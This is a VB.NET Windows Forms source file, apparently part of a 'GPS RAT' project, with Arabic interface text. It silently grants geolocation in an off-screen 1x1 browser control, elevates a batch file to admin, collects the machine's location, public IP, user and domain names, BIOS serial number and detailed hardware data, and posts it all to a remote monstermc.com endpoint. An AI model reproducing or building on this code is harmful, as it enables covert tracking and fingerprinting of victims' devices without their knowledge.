Imports System.Windows.Forms
Imports System.Net.Http
Imports System.Text
Imports Newtonsoft.Json
Imports Microsoft.Web.WebView2.WinForms
Imports Microsoft.Web.WebView2.Core

Public Class Form1
    Private Const API_URL As String = "https://www.monstermc.com/GPS%20RAT/api.php"

    Private WithEvents webView As WebView2
    Private lblStatus As Label

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Location Sender"
        Me.Size = New Size(400, 200)
        Me.FormBorderStyle = FormBorderStyle.FixedSingle
        Me.MaximizeBox = False

        Dim btnEnable As New Button()
        btnEnable.Text = "تفعيل Location (Admin)"
        btnEnable.Size = New Size(180, 40)
        btnEnable.Location = New Point(200, 20)
        btnEnable.BackColor = Color.Orange
        AddHandler btnEnable.Click, AddressOf BtnEnable_Click
        Me.Controls.Add(btnEnable)

        Dim btn As New Button()
        btn.Text = "بدء الإرسال"
        btn.Size = New Size(150, 40)
        btn.Location = New Point(20, 20)
        AddHandler btn.Click, AddressOf BtnStart_Click
        Me.Controls.Add(btn)

        lblStatus = New Label()
        lblStatus.Location = New Point(20, 70)
        lblStatus.Size = New Size(350, 100)
        lblStatus.Text = "جاهز..."
        Me.Controls.Add(lblStatus)

        webView = New WebView2()
        webView.Size = New Size(1, 1)
        webView.Location = New Point(-10, -10)
        Me.Controls.Add(webView)

        InitWebView()
    End Sub

    Private Sub BtnEnable_Click(sender As Object, e As EventArgs)
        Try
            Dim batPath = System.IO.Path.Combine(Application.StartupPath, "enable_location.bat")

            If Not System.IO.File.Exists(batPath) Then
                MessageBox.Show("enable_location.bat غير موجود!" & vbCrLf & vbCrLf &
                              "ضعه في نفس مجلد البرنامج", "خطأ", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            Dim psi As New ProcessStartInfo()
            psi.FileName = batPath
            psi.Verb = "runas"
            psi.UseShellExecute = True

            Process.Start(psi)

            MessageBox.Show("تم تشغيل enable_location.bat" & vbCrLf & vbCrLf &
                          "انتظر حتى ينتهي ثم أعد تشغيل البرنامج",
                          "معلومات", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Process.Start("https://github.com/noradlb1")

        Catch ex As Exception
            MessageBox.Show("Error: " & ex.Message, "خطأ", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    Private Async Sub InitWebView()
        Try
            Await webView.EnsureCoreWebView2Async(Nothing)

            AddHandler webView.CoreWebView2.PermissionRequested, Sub(s, e)
                                                                     If e.PermissionKind = CoreWebView2PermissionKind.Geolocation Then
                                                                         e.State = CoreWebView2PermissionState.Allow
                                                                     End If
                                                                 End Sub

            AddHandler webView.CoreWebView2.WebMessageReceived, AddressOf OnLocationReceived

        Catch ex As Exception
            lblStatus.Text = "Error: " & ex.Message
        End Try
    End Sub

    Private Sub BtnStart_Click(sender As Object, e As EventArgs)
        Try
            Dim htmlPath = System.IO.Path.Combine(Application.StartupPath, "getter.html")
            If System.IO.File.Exists(htmlPath) Then
                webView.CoreWebView2.Navigate("file:///" & htmlPath.Replace("\", "/"))
                lblStatus.Text = "جاري جمع الموقع..."
            Else
                lblStatus.Text = "خطأ: getter.html غير موجود"
            End If
        Catch ex As Exception
            lblStatus.Text = "Error: " & ex.Message
        End Try
    End Sub

    Private Async Sub OnLocationReceived(sender As Object, e As CoreWebView2WebMessageReceivedEventArgs)
        Try
            Dim json = e.TryGetWebMessageAsString()
            Dim loc = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(json)

            If loc.ContainsKey("error") Then
                Dim errCode = If(loc.ContainsKey("code"), loc("code").ToString(), "")

                If errCode = "1" Then
                    lblStatus.Text = "خطأ: Location مغلق في Windows!" & vbCrLf & vbCrLf &
                                   "الحل: Settings → Privacy → Location → ON"

                    MessageBox.Show(
                        "Windows Location غير مفعّل!" & vbCrLf & vbCrLf &
                        "الحل:" & vbCrLf &
                        "1. اضغط Win + I" & vbCrLf &
                        "2. Privacy & Security → Location" & vbCrLf &
                        "3. فعّل: Location services" & vbCrLf &
                        "4. فعّل: Let apps access location" & vbCrLf &
                        "5. فعّل: Let desktop apps access location" & vbCrLf &
                        "6. أعد تشغيل البرنامج",
                        "تنبيه", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                Else
                    lblStatus.Text = "خطأ: " & loc("error").ToString()
                End If
                Return
            End If

            ' Add comprehensive system info
            Dim sysInfo = GetFullSystemInfo()
            For Each kvp In sysInfo
                loc(kvp.Key) = kvp.Value
            Next

            lblStatus.Text = $"تم جمع الموقع - جاري الإرسال...{vbCrLf}Lat: {loc("lat")}, Lon: {loc("lon")}"

            Dim newJson = JsonConvert.SerializeObject(loc)

            Using client As New HttpClient()
                Dim content As New StringContent(newJson, Encoding.UTF8, "application/json")
                Dim response = Await client.PostAsync(API_URL, content)

                If response.IsSuccessStatusCode Then
                    lblStatus.Text = "✓ تم الإرسال بنجاح!"
                Else
                    lblStatus.Text = "✗ فشل الإرسال: " & response.StatusCode.ToString()
                End If
            End Using

        Catch ex As Exception
            lblStatus.Text = "Error: " & ex.Message
        End Try
    End Sub

    Private Function GetFullSystemInfo() As Dictionary(Of String, Object)
        Dim info As New Dictionary(Of String, Object)

        Try
            ' Basic Info
            info("os") = GetOSInfo()
            info("device_name") = Environment.MachineName
            info("pc_name") = Environment.UserName
            info("domain") = Environment.UserDomainName

            ' Get IP (will be set async)
            Task.Run(Async Function()
                         info("ip") = Await GetPublicIP()
                     End Function).Wait(5000)

            ' Processor Info
            Using searcher As New Management.ManagementObjectSearcher("SELECT Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed FROM Win32_Processor")
                For Each obj As Management.ManagementObject In searcher.Get()
                    info("cpu_name") = obj("Name")?.ToString()?.Trim()
                    info("cpu_cores") = obj("NumberOfCores")?.ToString()
                    info("cpu_threads") = obj("NumberOfLogicalProcessors")?.ToString()
                    info("cpu_speed") = obj("MaxClockSpeed")?.ToString() & " MHz"
                    Exit For
                Next
            End Using

            ' RAM Info
            Dim totalRAM As Long = 0
            Using searcher As New Management.ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory")
                For Each obj As Management.ManagementObject In searcher.Get()
                    totalRAM += CLng(obj("Capacity"))
                Next
            End Using
            info("ram_total") = FormatBytes(totalRAM)

            ' Available RAM
            Dim availRAM As Long = 0
            Using searcher As New Management.ManagementObjectSearcher("SELECT FreePhysicalMemory FROM Win32_OperatingSystem")
                For Each obj As Management.ManagementObject In searcher.Get()
                    availRAM = CLng(obj("FreePhysicalMemory")) * 1024
                    Exit For
                Next
            End Using
            info("ram_available") = FormatBytes(availRAM)

            ' Disk Info
            Dim drives As New List(Of String)
            For Each drive In IO.DriveInfo.GetDrives()
                If drive.IsReady Then
                    drives.Add($"{drive.Name} ({FormatBytes(drive.TotalSize)} / Free: {FormatBytes(drive.AvailableFreeSpace)})")
                End If
            Next
            info("drives") = String.Join(", ", drives)

            ' GPU Info
            Try
                Using searcher As New Management.ManagementObjectSearcher("SELECT Name, AdapterRAM FROM Win32_VideoController")
                    For Each obj As Management.ManagementObject In searcher.Get()
                        Dim gpuName = obj("Name")?.ToString()
                        Dim gpuRAM = If(obj("AdapterRAM") IsNot Nothing, FormatBytes(CLng(obj("AdapterRAM"))), "Unknown")
                        info("gpu") = $"{gpuName} ({gpuRAM})"
                        Exit For
                    Next
                End Using
            Catch ex As Exception
                info("gpu") = "Unknown"
            End Try

            ' OS Architecture
            info("os_architecture") = If(Environment.Is64BitOperatingSystem, "64-bit", "32-bit")

            ' OS Install Date
            Using searcher As New Management.ManagementObjectSearcher("SELECT InstallDate FROM Win32_OperatingSystem")
                For Each obj As Management.ManagementObject In searcher.Get()
                    Dim installDate = Management.ManagementDateTimeConverter.ToDateTime(obj("InstallDate").ToString())
                    info("os_install_date") = installDate.ToString("yyyy-MM-dd")
                    Exit For
                Next
            End Using

            ' System Uptime
            info("uptime") = FormatUptime(Environment.TickCount)

            ' Screen Resolution
            info("screen_resolution") = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}"

            ' .NET Version
            info("dotnet_version") = Environment.Version.ToString()

            ' Computer Manufacturer
            Using searcher As New Management.ManagementObjectSearcher("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
                For Each obj As Management.ManagementObject In searcher.Get()
                    info("manufacturer") = obj("Manufacturer")?.ToString()
                    info("model") = obj("Model")?.ToString()
                    Exit For
                Next
            End Using

            ' BIOS Info
            Using searcher As New Management.ManagementObjectSearcher("SELECT SerialNumber, Version FROM Win32_BIOS")
                For Each obj As Management.ManagementObject In searcher.Get()
                    info("serial_number") = obj("SerialNumber")?.ToString()
                    info("bios_version") = obj("Version")?.ToString()
                    Exit For
                Next
            End Using

            ' Motherboard
            Using searcher As New Management.ManagementObjectSearcher("SELECT Product, Manufacturer FROM Win32_BaseBoard")
                For Each obj As Management.ManagementObject In searcher.Get()
                    info("motherboard") = obj("Manufacturer")?.ToString() & " " & obj("Product")?.ToString()
                    Exit For
                Next
            End Using

            ' Network Adapters
            Dim adapters As New List(Of String)
            For Each ni In System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
                If ni.OperationalStatus = Net.NetworkInformation.OperationalStatus.Up AndAlso
                   ni.NetworkInterfaceType <> Net.NetworkInformation.NetworkInterfaceType.Loopback Then
                    adapters.Add($"{ni.Name} ({ni.Speed / 1000000} Mbps)")
                End If
            Next
            info("network_adapters") = String.Join(", ", adapters)

            ' Windows Product Key (masked)
            Try
                Dim key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                If key IsNot Nothing Then
                    info("windows_edition") = key.GetValue("EditionID", "Unknown").ToString()
                    info("windows_build") = key.GetValue("CurrentBuild", "Unknown").ToString()
                    key.Close()
                End If
            Catch ex As Exception
            End Try

        Catch ex As Exception
            info("error_collecting") = ex.Message
        End Try

        Return info
    End Function

    Private Function GetOSInfo() As String
        Try
            Using searcher As New Management.ManagementObjectSearcher("SELECT Caption, Version FROM Win32_OperatingSystem")
                For Each obj As Management.ManagementObject In searcher.Get()
                    Return obj("Caption").ToString() & " (Build " & obj("Version").ToString() & ")"
                Next
            End Using
        Catch ex As Exception
        End Try
        Return "Unknown"
    End Function

    Private Async Function GetPublicIP() As Task(Of String)
        Try
            Using client As New HttpClient()
                client.Timeout = TimeSpan.FromSeconds(5)
                Dim ip = Await client.GetStringAsync("https://api.ipify.org")
                Return ip.Trim()
            End Using
        Catch ex As Exception
            Return "Unknown"
        End Try
    End Function

    Private Function FormatBytes(bytes As Long) As String
        Dim sizes() As String = {"B", "KB", "MB", "GB", "TB"}
        Dim order As Integer = 0
        Dim size As Double = bytes

        While size >= 1024 AndAlso order < sizes.Length - 1
            order += 1
            size = size / 1024
        End While

        Return $"{size:0.##} {sizes(order)}"
    End Function

    Private Function FormatUptime(milliseconds As Integer) As String
        Dim ts = TimeSpan.FromMilliseconds(milliseconds)
        Return $"{ts.Days}d {ts.Hours}h {ts.Minutes}m"
    End Function
End Class